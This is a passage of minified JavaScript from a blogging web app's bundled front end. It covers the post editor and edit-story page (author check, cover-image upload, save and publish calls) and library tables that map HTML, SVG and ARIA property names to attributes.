gap-3",children:[o.jsx("input",{ref:$,type:"file",accept:"image/*",onChange:Z,className:"hidden"}),o.jsxs(Ee,{type:"button",variant:"outline",onClick:()=>{var oe;return(oe=$.current)==null?void 0:oe.click()},disabled:A||M,className:"gap-2",children:[o.jsx(Kg,{className:"h-4 w-4"}),M?"Uploading...":E?"Change Image":"Upload Image"]}),E&&o.jsxs("div",{className:"flex items-center gap-2",children:[o.jsx(Vg,{className:"h-4 w-4 text-green-600"}),o.jsx("span",{className:"text-sm text-gray-600",children:"Image uploaded"})]})]}),E&&o.jsx("div",{className:"mt-2",children:o.jsx("img",{src:E,alt:"Cover preview",className:"h-24 w-auto rounded-md border object-cover"})})]})]}),o.jsx("div",{className:"border-t pt-6",children:o.jsx(Rk,{value:m,onChange:x,options:ye,ref:Y})}),o.jsx("div",{children:o.jsx("input",{type:"text",value:f,onChange:oe=>h(oe.target.value),placeholder:"#tag1 #tag2 #tag3...",className:"w-full text-lg text-gray-600 border-none outline-none focus:ring-0 placeholder-gray-300",disabled:A})}),o.jsxs("div",{className:"flex items-center justify-end space-x-3 pt-4 border-t",children:[o.jsxs(Ee,{variant:"outline",onClick:J,disabled:A,className:"gap-2",children:[o.jsx(Bl,{className:"h-4 w-4"}),"Save Draft"]}),o.jsxs(Ee,{onClick:pe,disabled:A,className:"gap-2",children:[o.jsx(Qg,{className:"h-4 w-4"}),A?"Publishing...":"Publish"]})]})]})]})})}function bI(){const{id:e}=Vu(),{user:t,isAuthenticated:n}=Gt(),r=Ln(),[a,l]=j.useState(""),[u,f]=j.useState(""),[h,m]=j.useState(""),[x,g]=j.useState(""),[b,E]=j.useState(""),[C,P]=j.useState(""),[O,N]=j.useState(null),[T,A]=j.useState("DRAFT"),[_,M]=j.useState([]),[R,B]=j.useState(!0),[U,$]=j.useState(!1),[Y,ne]=j.useState(!1),[Z,me]=j.useState(""),ye=j.useRef(null),J=j.useRef(null);j.useEffect(()=>{if(!n){r("/login");return}pe(),oe()},[e,n,r]);const pe=async()=>{var k,se,Ve;try{const Ke=(await _e.get(`/api/posts/${e}`)).data;if(Ke.authorId!==t.id){alert("You are not authorized to edit this post"),r("/dashboard");return}l(Ke.title),f(Ke.summary||"");const vt=Ke.tags?Ke.tags.map(lt=>typeof lt=="object"?lt.name:lt):[];m(vt.map(lt=>`#${lt}`).join(" ")),g(Ke.content),E(((k=Ke.categoryId)==null?void 0:k.toString())||""),P(Ke.coverImageUrl||""),A(Ke.status),B(!1)}catch(De){console.error("Failed to fetch post:",De),me(((Ve=(se=De.response)==null?void 0:se.data)==null?void 0:Ve.message)||"Failed to load post"),B(!1)}},oe=async()=>{try{const k=await _e.get("/api/categories");M(k.data)}catch(k){console.error("Failed to fetch categories:",k)}},ae=async k=>{var Ve,De;const se=new FormData;se.append("file",k);try{return(await _e.post("/api/posts/upload-image",se,{headers:{"Content-Type":"multipart/form-data"}})).data.fileUrl}catch(Ke){throw console.error("Failed to upload image:",Ke),new Error(((De=(Ve=Ke.response)==null?void 0:Ve.data)==null?void 0:De.message)||"Failed to upload image")}},xe=async k=>{var Ve;const se=(Ve=k.target.files)==null?void 0:Ve[0];if(se){if(!se.type.startsWith("image/")){me("Please select an image file");return}if(se.size>5*1024*1024){me("Image size must be less than 5MB");return}ne(!0),me("");try{const De=await ae(se);P(De),N(se)}catch(De){me(De.message)}finally{ne(!1)}}},q=async(k,se,Ve)=>{try{const De=await ae(k);se(De)}catch(De){Ve(De.message)}},We=j.useMemo(()=>({spellChecker:!1,placeholder:"Write your story...",status:!1,uploadImage:!0,imageUploadFunction:q,toolbar:["bold","italic","heading","|","quote","unordered-list","ordered-list","|","link","upload-image","|","preview","side-by-side","fullscreen","|","guide"]}),[]),Q=async k=>{var se,Ve,De;if(!a.trim()){me("Title is required");return}if(!x.trim()){me("Content is required");return}$(!0),me("");try{const Ke=((se=h.match(/#[\w\u00C0-\u024F]+/g))==null?void 0:se.map(Tt=>Tt.slice(1)))||[],vt={title:a.trim(),summary:u.trim()||null,tags:Ke,content:x.trim(),categoryId:b?parseInt(b):null,coverImageUrl:C.trim()||null,status:k},lt=await _e.patch(`/api/posts/${e}`,vt);r(k==="PUBLISHED"?`/post/${lt.data.slug}`:"/dashboard")}catch(Ke){console.error("Failed to update post:",Ke),me(((De=(Ve=Ke.response)==null?void 0:Ve.data)==null?void 0:De.message)||"Failed to update post")}finally{$(!1)}};return R?o.jsx("div",{className:"min-h-screen bg-gray-50 flex items-center justify-center",children:o.jsxs("div",{className:"text-center",children:[o.jsx("div",{className:"inline-block animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600"}),o.jsx("p",{className:"mt-4 text-gray-600",children:"Loading post..."})]})}):o.jsx("div",{className:"min-h-screen bg-gray-50",children:o.jsxs("div",{className:"container mx-auto px-4 py-8 max-w-4xl",children:[o.jsxs("div",{className:"flex items-center justify-between mb-6",children:[o.jsxs("div",{className:"flex items-center gap-4",children:[o.jsx("h1",{className:"text-3xl font-bold",children:"Edit Story"}),o.jsx("span",{className:`px-3 py-1 rounded-full text-xs font-medium ${T==="PUBLISHED"?"bg-green-100 text-green-800":T==="DRAFT"?"bg-gray-100 text-gray-800":T==="PENDING_REVIEW"?"bg-yellow-100 text-yellow-800":T==="ARCHIVED"?"bg-red-100 text-red-800":"bg-orange-100 text-orange-800"}`,children:T.replace("_"," ")})]}),o.jsx(Ee,{variant:"ghost",onClick:()=>r(-1),children:o.jsx(Bi,{className:"h-5 w-5"})})]}),Z&&o.jsx("div",{className:"mb-4 p-4 bg-red-50 border border-red-200 rounded-md",children:o.jsx("p",{className:"text-sm text-red-800",children:Z})}),o.jsxs("div",{className:"bg-white rounded-lg shadow-sm p-6 space-y-6",children:[o.jsx("div",{children:o.jsx("input",{type:"text",value:a,onChange:k=>l(k.target.value),placeholder:"Title",className:"w-full text-4xl font-bold border-none outline-none focus:ring-0 placeholder-gray-300",disabled:U})}),o.jsx("div",{children:o.jsx("textarea",{value:u,onChange:k=>f(k.target.value),placeholder:"Write a short summary...",className:"w-full text-xl text-gray-600 border-none outline-none focus:ring-0 placeholder-gray-300 resize-none",rows:2,disabled:U})}),o.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-4 pt-4 border-t",children:[o.jsxs("div",{children:[o.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Category"}),o.jsxs("select",{value:b,onChange:k=>E(k.target.value),className:"w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500",disabled:U,children:[o.jsx("option",{value:"",children:"Select a category"}),_.map(k=>o.jsx("option",{value:k.id,children:k.name},k.id))]})]}),o.jsxs("div",{children:[o.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Cover Image"}),o.jsxs("div",{className:"flex items-center gap-3",children:[o.jsx("input",{ref:ye,type:"file",accept:"image/*",onChange:xe,className:"hidden"}),o.jsxs(Ee,{type:"button",variant:"outline",onClick:()=>{var k;return(k=ye.current)==null?void 0:k.click()},disabled:U||Y,className:"gap-2",children:[o.jsx(Kg,{className:"h-4 w-4"}),Y?"Uploading...":C?"Change Image":"Upload Image"]}),C&&o.jsxs("div",{className:"flex items-center gap-2",children:[o.jsx(Vg,{className:"h-4 w-4 text-green-600"}),o.jsx("span",{className:"text-sm text-gray-600",children:"Image uploaded"})]})]}),C&&o.jsx("div",{className:"mt-2",children:o.jsx("img",{src:C,alt:"Cover preview",className:"h-24 w-auto rounded-md border object-cover"})})]})]}),o.jsx("div",{className:"border-t pt-6",children:o.jsx(Rk,{value:x,onChange:g,options:We,ref:J})}),o.jsx("div",{children:o.jsx("input",{type:"text",value:h,onChange:k=>m(k.target.value),placeholder:"#tag1 #tag2 #tag3...",className:"w-full text-lg text-gray-600 border-none outline-none focus:ring-0 placeholder-gray-300",disabled:U})}),o.jsxs("div",{className:"flex items-center justify-end space-x-3 pt-4 border-t",children:[o.jsxs(Ee,{variant:"outline",onClick:()=>Q("DRAFT"),disabled:U,className:"gap-2",children:[o.jsx(Bl,{className:"h-4 w-4"}),"Save Draft"]}),o.jsxs(Ee,{onClick:()=>Q("PUBLISHED"),disabled:U,className:"gap-2",children:[o.jsx(Qg,{className:"h-4 w-4"}),U?"Updating...":T==="PUBLISHED"?"Update & Publish":"Publish"]})]})]})]})})}function lb(e){const t=[],n=String(e||"");let r=n.indexOf(","),a=0,l=!1;for(;!l;){r===-1&&(r=n.length,l=!0);const u=n.slice(a,r).trim();(u||!l)&&t.push(u),a=r+1,r=n.indexOf(",",a)}return t}function Ok(e,t){const n={};return(e[e.length-1]===""?[...e,""]:e).join((n.padRight?" ":"")+","+(n.padLeft===!1?"":" ")).trim()}const EI=/^[$_\p{ID_Start}][$_\u{200C}\u{200D}\p{ID_Continue}]*$/u,wI=/^[$_\p{ID_Start}][-$_\u{200C}\u{200D}\p{ID_Continue}]*$/u,kI={};function ob(e,t){return(kI.jsx?wI:EI).test(e)}const TI=/[ \t\n\f\r]/g;function CI(e){return typeof e=="object"?e.type==="text"?ub(e.value):!1:ub(e)}function ub(e){return e.replace(TI,"")===""}let tc=class{constructor(t,n,r){this.normal=n,this.property=t,r&&(this.space=r)}};tc.prototype.normal={};tc.prototype.property={};tc.prototype.space=void 0;function Fk(e,t){const n={},r={};for(const a of e)Object.assign(n,a.property),Object.assign(r,a.normal);return new tc(n,r,t)}function Fu(e){return e.toLowerCase()}let dr=class{constructor(t,n){this.attribute=n,this.property=t}};dr.prototype.attribute="";dr.prototype.booleanish=!1;dr.prototype.boolean=!1;dr.prototype.commaOrSpaceSeparated=!1;dr.prototype.commaSeparated=!1;dr.prototype.defined=!1;dr.prototype.mustUseProperty=!1;dr.prototype.number=!1;dr.prototype.overloadedBoolean=!1;dr.prototype.property="";dr.prototype.spaceSeparated=!1;dr.prototype.space=void 0;let SI=0;const st=bs(),sn=bs(),T0=bs(),Ne=bs(),Lt=bs(),yl=bs(),pr=bs();function bs(){return 2**++SI}const C0=Object.freeze(Object.defineProperty({__proto__:null,boolean:st,booleanish:sn,commaOrSpaceSeparated:pr,commaSeparated:yl,number:Ne,overloadedBoolean:T0,spaceSeparated:Lt},Symbol.toStringTag,{value:"Module"})),nm=Object.keys(C0);let ax=class extends dr{constructor(t,n,r,a){let l=-1;if(super(t,n),cb(this,"space",a),typeof r=="number")for(;++l<nm.length;){const u=nm[l];cb(this,nm[l],(r&C0[u])===C0[u])}}};ax.prototype.defined=!0;function cb(e,t,n){n&&(e[t]=n)}function Ul(e){const t={},n={};for(const[r,a]of Object.entries(e.properties)){const l=new ax(r,e.transform(e.attributes||{},r),a,e.space);e.mustUseProperty&&e.mustUseProperty.includes(r)&&(l.mustUseProperty=!0),t[r]=l,n[Fu(r)]=r,n[Fu(l.attribute)]=r}return new tc(t,n,e.space)}const Mk=Ul({properties:{ariaActiveDescendant:null,ariaAtomic:sn,ariaAutoComplete:null,ariaBusy:sn,ariaChecked:sn,ariaColCount:Ne,ariaColIndex:Ne,ariaColSpan:Ne,ariaControls:Lt,ariaCurrent:null,ariaDescribedBy:Lt,ariaDetails:null,ariaDisabled:sn,ariaDropEffect:Lt,ariaErrorMessage:null,ariaExpanded:sn,ariaFlowTo:Lt,ariaGrabbed:sn,ariaHasPopup:null,ariaHidden:sn,ariaInvalid:null,ariaKeyShortcuts:null,ariaLabel:null,ariaLabelledBy:Lt,ariaLevel:Ne,ariaLive:null,ariaModal:sn,ariaMultiLine:sn,ariaMultiSelectable:sn,ariaOrientation:null,ariaOwns:Lt,ariaPlaceholder:null,ariaPosInSet:Ne,ariaPressed:sn,ariaReadOnly:sn,ariaRelevant:null,ariaRequired:sn,ariaRoleDescription:Lt,ariaRowCount:Ne,ariaRowIndex:Ne,ariaRowSpan:Ne,ariaSelected:sn,ariaSetSize:Ne,ariaSort:null,ariaValueMax:Ne,ariaValueMin:Ne,ariaValueNow:Ne,ariaValueText:null,role:null},transform(e,t){return t==="role"?t:"aria-"+t.slice(4).toLowerCase()}});function Bk(e,t){return t in e?e[t]:t}function Hk(e,t){return Bk(e,t.toLowerCase())}const NI=Ul({attributes:{acceptcharset:"accept-charset",classname:"class",htmlfor:"for",httpequiv:"http-equiv"},mustUseProperty:["checked","multiple","muted","selected"],properties:{abbr:null,accept:yl,acceptCharset:Lt,accessKey:Lt,action:null,allow:null,allowFullScreen:st,allowPaymentRequest:st,allowUserMedia:st,alt:null,as:null,async:st,autoCapitalize:null,autoComplete:Lt,autoFocus:st,autoPlay:st,blocking:Lt,capture:null,charSet:null,checked:st,cite:null,className:Lt,cols:Ne,colSpan:null,content:null,contentEditable:sn,controls:st,controlsList:Lt,coords:Ne|yl,crossOrigin:null,data:null,dateTime:null,decoding:null,default:st,defer:st,dir:null,dirName:null,disabled:st,download:T0,draggable:sn,encType:null,enterKeyHint:null,fetchPriority:null,form:null,formAction:null,formEncType:null,formMethod:null,formNoValidate:st,formTarget:null,headers:Lt,height:Ne,hidden:T0,high:Ne,href:null,hrefLang:null,htmlFor:Lt,httpEquiv:Lt,id:null,imageSizes:null,imageSrcSet:null,inert:st,inputMode:null,integrity:null,is:null,isMap:st,itemId:null,itemProp:Lt,itemRef:Lt,itemScope:st,itemType:Lt,kind:null,label:null,lang:null,language:null,list:null,loading:null,loop:st,low:Ne,manifest:null,max:null,maxLength:Ne,media:null,method:null,min:null,minLength:Ne,multiple:st,muted:st,name:null,nonce:null,noModule:st,noValidate:st,onAbort:null,onAfterPrint:null,onAuxClick:null,onBeforeMatch:null,onBeforePrint:null,onBeforeToggle:null,onBeforeUnload:null,onBlur:null,onCancel:null,onCanPlay:null,onCanPlayThrough:null,onChange:null,onClick:null,onClose:null,onContextLost:null,onContextMenu:null,onContextRestored:null,onCopy:null,onCueChange:null,onCut:null,onDblClick:null,onDrag:null,onDragEnd:null,onDragEnter:null,onDragExit:null,onDragLeave:null,onDragOver:null,onDragStart:null,onDrop:null,onDurationChange:null,onEmptied:null,onEnded:null,onError:null,onFocus:null,onFormData:null,onHashChange:null,onInput:null,onInvalid:null,onKeyDown:null,onKeyPress:null,onKeyUp:null,onLanguageChange:null,onLoad:null,onLoadedData:null,onLoadedMetadata:null,onLoadEnd:null,onLoadStart:null,onMessage:null,onMessageError:null,onMouseDown:null,onMouseEnter:null,onMouseLeave:null,onMouseMove:null,onMouseOut:null,onMouseOver:null,onMouseUp:null,onOffline:null,onOnline:null,onPageHide:null,onPageShow:null,onPaste:null,onPause:null,onPlay:null,onPlaying:null,onPopState:null,onProgress:null,onRateChange:null,onRejectionHandled:null,onReset:null,onResize:null,onScroll:null,onScrollEnd:null,onSecurityPolicyViolation:null,onSeeked:null,onSeeking:null,onSelect:null,onSlotChange:null,onStalled:null,onStorage:null,onSubmit:null,onSuspend:null,onTimeUpdate:null,onToggle:null,onUnhandledRejection:null,onUnload:null,onVolumeChange:null,onWaiting:null,onWheel:null,open:st,optimum:Ne,pattern:null,ping:Lt,placeholder:null,playsInline:st,popover:null,popoverTarget:null,popoverTargetAction:null,poster:null,preload:null,readOnly:st,referrerPolicy:null,rel:Lt,required:st,reversed:st,rows:Ne,rowSpan:Ne,sandbox:Lt,scope:null,scoped:st,seamless:st,selected:st,shadowRootClonable:st,shadowRootDelegatesFocus:st,shadowRootMode:null,shape:null,size:Ne,sizes:null,slot:null,span:Ne,spellCheck:sn,src:null,srcDoc:null,srcLang:null,srcSet:null,start:Ne,step:null,style:null,tabIndex:Ne,target:null,title:null,translate:null,type:null,typeMustMatch:st,useMap:null,value:sn,width:Ne,wrap:null,writingSuggestions:null,align:null,aLink:null,archive:Lt,axis:null,background:null,bgColor:null,border:Ne,borderColor:null,bottomMargin:Ne,cellPadding:null,cellSpacing:null,char:null,charOff:null,classId:null,clear:null,code:null,codeBase:null,codeType:null,color:null,compact:st,declare:st,event:null,face:null,frame:null,frameBorder:null,hSpace:Ne,leftMargin:Ne,link:null,longDesc:null,lowSrc:null,marginHeight:Ne,marginWidth:Ne,noResize:st,noHref:st,noShade:st,noWrap:st,object:null,profile:null,prompt:null,rev:null,rightMargin:Ne,rules:null,scheme:null,scrolling:sn,standby:null,summary:null,text:null,topMargin:Ne,valueType:null,version:null,vAlign:null,vLink:null,vSpace:Ne,allowTransparency:null,autoCorrect:null,autoSave:null,disablePictureInPicture:st,disableRemotePlayback:st,prefix:null,property:null,results:Ne,security:null,unselectable:null},space:"html",transform:Hk}),AI=Ul({attributes:{accentHeight:"accent-height",alignmentBaseline:"alignment-baseline",arabicForm:"arabic-form",baselineShift:"baseline-shift",capHeight:"cap-height",className:"class",clipPath:"clip-path",clipRule:"clip-rule",colorInterpolation:"color-interpolation",colorInterpolationFilters:"color-interpolation-filters",colorProfile:"color-profile",colorRendering:"color-rendering",crossOrigin:"crossorigin",dataType:"datatype",dominantBaseline:"dominant-baseline",enableBackground:"enable-background",fillOpacity:"fill-opacity",fillRule:"fill-rule",floodColor:"flood-color",floodOpacity:"flood-opacity",fontFamily:"font-family",fontSize:"font-size",fontSizeAdjust:"font-size-adjust",fontStretch:"font-stretch",fontStyle:"font-style",fontVariant:"font-variant",fontWeight:"font-weight",glyphName:"glyph-name",glyphOrientationHorizontal:"glyph-orientation-horizontal",glyphOrientationVertical:"glyph-orientation-vertical",hrefLang:"hreflang",horizAdvX:"horiz-adv-x",horizOriginX:"horiz-origin-x",horizOriginY:"horiz-origin-y",imageRendering:"image-rendering",letterSpacing:"letter-spacing",lightingColor:"lighting-color",markerEnd:"marker-end",markerMid:"marker-mid",markerStart:"marker-start",navDown:"nav-down",navDownLeft:"nav-down-left",navDownRight:"nav-down-right",navLeft:"nav-left",navNext:"nav-next",navPrev:"nav-prev",navRight:"nav-right",navUp:"nav-up",navUpLeft:"nav-up-left",navUpRight:"nav-up-right",onAbort:"onabort",onActivate:"onactivate",onAfterPrint:"onafterprint",onBeforePrint:"onbeforeprint",onBegin:"onbegin",onCancel:"oncancel",onCanPlay:"oncanplay",onCanPlayThrough:"oncanplaythrough",onChange:"onchange",onClick:"onclick",onClose:"onclose",onCopy:"oncopy",onCueChange:"oncuechange",onCut:"oncut",onDblClick:"ondblclick",onDrag:"ondrag",onDragEnd:"ondragend",onDragEnter:"ondragenter",onDragExit:"ondragexit",onDragLeave:"ondragleave",onDragOver:"ondragover",onDragStart:"ondragstart",onDrop:"ondrop",onDurationChange:"ondurationchange",onEmptied:"onemptied",onEnd:"onend",onEnded:"onended",onError:"onerror",onFocus:"onfocus",onFocusIn:"onfocusin",onFocusOut:"onfocusout",onHashChange:"onhashchange",onInput:"oninput",onInvalid:"oninvalid",onKeyDown:"onkeydown",onKeyPress:"onkeypress",onKeyUp:"onkeyup",onLoad:"onload",onLoadedData:"onloadeddata",onLoadedMetadata:"onloadedmetadata",onLoadStart:"onloadstart",onMessage:"onmessage",onMouseDown:"onmousedown",onMouseEnter:"onmouseenter",onMouseLeave:"onmouseleave",onMouseMove:"onmousemove",onMouseOut:"onmouseout",onMouseOver:"onmouseover",onMouseUp:"onmouseup",onMouseWheel:"onmousewheel",onOffline:"onoffline",onOnline:"ononline",onPageHide:"onpagehide",onPageShow:"onpageshow",onPaste:"onpaste",onPause:"onpause",onPlay:"onplay",onPlaying:"onplaying",onPopState:"onpopstate",onProgress:"onprogress",onRateChange:"onratechange",onRepeat:"onrepeat",onReset:"onreset",onResize:"onresize",onScroll:"onscroll",onSeeked:"onseeked",onSeeking:"onseeking",onSelect:"onselect",onShow:"onshow",onStalled:"onstalled",onStorage:"onstorage",onSubmit:"onsubmit",onSuspend:"onsuspend",onTimeUpdate:"ontimeupdate",onToggle:"ontoggle",onUnload:"onunload",onVolumeChange:"onvolumechange",onWaiting:"onwaiting",onZoom:"onzoom",overlinePosition:"overline-position",overlineThickness:"overline-thickness",paintOrder:"paint-order",panose1:"panose-1",pointerEvents:"pointer-events",referrerPolicy:"referrerpolicy",renderingIntent:"rendering-intent",shapeRendering:"shape-rendering",stopColor:"stop-color",stopOpacity:"stop-opacity",strikethroughPosition:"strikethrough-position",strikethroughThickness:"strikethrough-thickness",strokeDashArray:"stroke-dasharray",strokeDashOffset:"stroke-dashoffset",strokeLineCap:"stroke-linecap",strokeLineJoin:"stroke-linejoin",strokeMiterLimit:"stroke-miterlimit",strokeOpacity:"stroke-opacity",strokeWidth:"stroke-width",tabIndex:"tabindex",textAnchor:"text-anchor",textDecoration:"text-decoration",textRendering:"text-rendering",transformOrigin:"transform-origin",typeOf:"typeof",underlinePosition:"underline-position",underlineThickness:"underline-thickness",unicodeBidi:"unicode-bidi",unicodeRange:"unicode-range",unitsPerEm:"units-per-em",vAlphabetic:"v-alphabetic",vHanging:"v-hanging",vIdeographic:"v-ideographic",vMathematical:"v-mathematical",vectorEffect:"vector-effect",vertAdvY:"vert-adv-y",vertOriginX:"vert-origin-x",vertOriginY:"vert-origin-y",wordSpacing:"word-spacing",writingMode:"writing-mode",xHeight:"x-height",playbackOrder:"playbackorder",timelineBegin:"timelinebegin"},properties:{about:pr,accentHeight:Ne,accumulate:null,additive:null,alignmentBaseline:null,alphabetic:Ne,amplitude:Ne,arabicForm:null,ascent:Ne,attributeName:null,attributeType:null,azimuth:Ne,bandwidth:null,baselineShift:null,baseFrequency:null,baseProfile:null,bbox:null,begin:null,bias:Ne,by:null,calcMode:null,capHeight:Ne,className:Lt,clip:null,clipPath:null,clipPathUnits:null,clipRule:null,color:null,colorInterpolation:null,colorInterpolationFilters:null,colorProfile:null,colorRendering:null,content:null,contentScriptType:null,contentStyleType:null,crossOrigin:null,cursor:null,cx:null,cy:null,d:null,dataType:null,defaultAction:null,descent:Ne,diffuseConstant:Ne,direction:null,display:null,dur:null,divisor:Ne,dominantBaseline:null,download:st,dx:null,dy:null,edgeMode:null,editable:null,elevation:Ne,enableBackground:null,end:null,event:null,exponent:Ne,externalResourcesRequired:null,fill:null,fillOpacity:Ne,fillRule:null,filter:null,filterRes:null,filterUnits:null,floodColor:null,floodOpacity:null,focusable:null,focusHighlight:null,fontFamily:null,fontSize:null,fontSizeAdjust:null,fontStretch:null,fontStyle:null,fontVariant:null,fontWeight:null,format:null,fr:null,from:null,fx:null,fy:null,g1:yl,g2:yl,glyphName:yl,glyphOrientationHorizontal:null,glyphOrientationVertical:null,glyphRef:null,gradientTransform:null,gradientUnits:null,handler:null,hanging:Ne,hatchContentUnits:null,hatchUnits:null,height:null,href:null,hrefLang:null,horizAdvX:Ne,horizOriginX:Ne,horizOriginY:Ne,id:null,ideographic:Ne,imageRendering:null,initialVisibility:null,in:null,in2:null,intercept:Ne,k:Ne,k1:Ne,k2:Ne,k3:Ne,k4:Ne,kernelMatrix:pr,kernelUnitLength:null,keyPoints:null,keySplines:null,keyTimes:null,kerning:null,lang:null,lengthAdjust:null,letterSpacing:null,lightingColor:null,limitingConeAngle:Ne,local:null,markerEnd:null,markerMid:null,markerStart:null,markerHeight:null,markerUnits:null,markerWidth:null,mask:null,maskContentUnits:null,maskUnits:null,mathematical:null,max:null,media:null,mediaCharacterEncoding:null,mediaContentEncodings:null,mediaSize:Ne,mediaTime:null,method:null,min:null,mode:null,name:null,navDown:null,navDownLeft:null,navDownRight:null,navLeft:null,navNext:null,navPrev:null,navRight:null,navUp:null,navUpLeft:null,navUpRight:null,numOctaves:null,observer:null,offset:null,onAbort:null,onActivate:null,onAfterPrint:null,onBeforePrint:null,onBegin:null,onCancel:null,onCanPlay:null,onCanPlayThrough:null,onChange:null,onClick:null,onClose:null,onCopy:null,onCueChange:null,onCut:null,onDblClick:null,onDrag:null,onDragEnd:null,onDragEnter:null,onDragExit:null,onDragLeave:null,onDragOver:null,onDragStart:null,onDrop:null,onDurationChange:null,onEmptied:null,onEnd:null,onEnded:null,onError:null,onFocus:null,onFocusIn:null,onFocusOut:null,onHashChange:null,onInput:null,onInvalid:null,onKeyDown:null,onKeyPress:null,onKeyUp:null,onLoad:null,onLoadedData:null,onLoadedMetadata:null,onLoadStart:null,onMessage:null,onMouseDown:null,onMouseEnter:null,onMouseLeave:null,onMouseMove:null,onMouseOut:null,onMouseOver:null,onMouseUp:null,onMouseWheel:null,onOffline:null,onOnline:null,onPageHide:null,onPageShow:null,onPaste:null,onPause:null,onPlay:null,onPlaying:null,onPopState:null,onProgress:null,onRateChange:null,onRepeat:null,onReset:null,onResize:null,onScroll:null,onSeeked:null,onSeeking:null,onSelect:null,onShow:null,onStalled:null,onStorage:null,onSubmit:null,onSuspend:null,onTimeUpdate:null,onToggle:null,onUnload:null,onVolumeChange:null,onWaiting:null,onZoom:null,opacity:null,operator:null,order:null,orient:null,orientation:null,origin:null,overflow:null,overlay:null,overlinePosition:Ne,overlineThickness:Ne,paintOrder:null,panose1:null,path:null,pathLength:Ne,patternContentUnits:null,patternTransform:null,patternUnits:null,phase:null,ping:Lt,pitch:null,playbackOrder:null,pointerEvents:null,points:null,pointsAtX:Ne,pointsAtY:Ne,pointsAtZ:Ne,preserveAlpha:null,preserveAspectRatio:null,primitiveUnits:null,propagate:null,property:pr,r:null,radius:null,referrerPolicy:null,refX:null,refY:null,rel:pr,rev:pr,renderingIntent:null,repeatCount:null,repeatDur:null,requiredExtensions:pr,requiredFeatures:pr,requiredFonts:pr,requiredFormats:pr,resource:null,restart:null,result:null,rotate:null,rx:null,ry:null,scale:null,seed:null,shapeRendering:null,side:null,slope:null,snapshotTime:null,specularConstant:Ne,specularExponent:Ne,spreadMethod:null,spacing:null,startOffset:null,stdDeviation:null,stemh:null,stemv:null,stitchTiles:null,stopColor:null,stopOpacity:null,strikethroughPosition:Ne,strikethroughThickness:Ne,string:null,stroke:null,strokeDashArray:pr,strokeDashOffset:null,strokeLineCap:null,strokeLineJoin:null,strokeMiterLimit:Ne,strokeOpacity:Ne,strokeWidth:null,style:null,surfaceScale:Ne,syncBehavior:null,syncBehaviorDefault:null,syncMaster:null,syncTolerance:null,syncToleranceDefault:null,systemLanguage:pr,tabIndex:Ne,tableValues:null,target:null,targetX:Ne,targetY:Ne,textAnchor:null,textDecoration:null,textRendering:null,textLength:null,timelineBegin:null,title:null,transformBehavior:null,type:null,typeOf:pr,to:null,transform:null,transformOrigin:null,u1:null,u2:null,underlinePosition:Ne,underlineThickness:Ne,unicode:null,unicodeBidi:null,unicodeRange:null,unitsPerEm:Ne,values:null,vAlphabetic:Ne,vMathematical:Ne,vectorEffect:null,vHanging:Ne,vIdeographic:Ne,version:null,vertAdvY:Ne,vertOriginX:Ne,vertOriginY:Ne,viewBox:null,viewTarget:null,visibility:null,width:null,widths:null,wordSpacing:null,writingMode:null,x:null,x1:null,x2:null,xChannelSelector:null,xHeight:Ne,y:null,y1:null,y2:null,yChannelSelector:null,z:null,zoomAndPan:null},space:"svg",transform:Bk}),Uk=Ul({properties:{xLinkActuate:null,xLinkArcRole:null,xLinkHref:null,xLinkRole:null,xLinkShow:null,xLinkTitle:null,xLinkType:null},space:"xlink",transform(e,t){return"xlink:"+t.slice(5).toLowerCase()}}),zk=Ul({attributes:{xmlnsxlink:"xmlns:xlink"},properties:{xmlnsXLink:null,xmlns:null},space:"xmlns",transform:Hk}),Wk=Ul({properties:{xmlBase:null,xmlLang:null,xmlSpace:null},space:"xml",transform(e,t){return"xml:"+t.slice(3).toLowerCase()}}),DI={classId:"classID",dataType:"datatype",itemId:"itemID",strokeDashArray:"strokeDasharray",strokeDashOffset:"strokeDashoffset",strokeLineCap:"strokeLinecap",strokeLineJoin:"strokeLinejoin",strokeMiterLimit:"strokeMiterlimit",typeOf:"typeof",xLinkActuate:"xlinkActuate",xLinkArcRole:"xlinkArcrole",xLinkHref:"xlinkHref",xLinkRole:"xlinkRole",xLinkShow:"xlinkShow",xLinkTitle:"xlinkTitle",xLinkType:"xlinkType",xmlnsXLink:"xmlnsXlink"},LI=/[A-Z]/g,db=/-[a-z]/g,_I=/^data[-\w.:]+$/i;function sx(e,t){const n=Fu(t);let r=t,a=dr;if(n in e.normal)return e.property[e.normal[n]];if(n.length>4&&n.slice(0,4)==="data"&&_I.test(t)){if(t.charAt(4)==="-"){const l=t.slice(5).replace(db,PI);r="data"+l.charAt(0).toUpperCase()+l.slice(1)}else{const l=t.slice(4);if(!db.test(l)){let u=l.replace(LI,II);u.charAt(0)!=="-"&&(u="-"+u),t="data"+u}}a=ax}return new a(r,t)}function II(e){return"-"+e.toLowerCase()}function PI(e){return e.charAt(1).toUpperCase()}const lh=Fk([Mk,NI,Uk,zk,Wk],"html"),zl=Fk([Mk,AI,Uk,zk,Wk],"svg");function fb(e){const t=String(e||"").trim();return t?t.split(/[ \t\n\r\f]+/g):[]}function qk(e){return e.join(" ").trim()}var lx={},hb=/\/\*[^*]*\*+([^/*][^*]*\*+)*\//g,jI=/\n/g,RI=/^\s*/,OI=/^(\*?[-#/*\\\w]+(\[[0-9a-z_-]+\])?)\s*/,FI=/^:\s*/,MI=/^((?:'(?:\\'|.)*?'|"(?:\\"|.)*?"|\([^)]*?\)|[^};])+)/,BI=/^[;\s]*/,HI=/^\s+|\s+$/g,UI=`
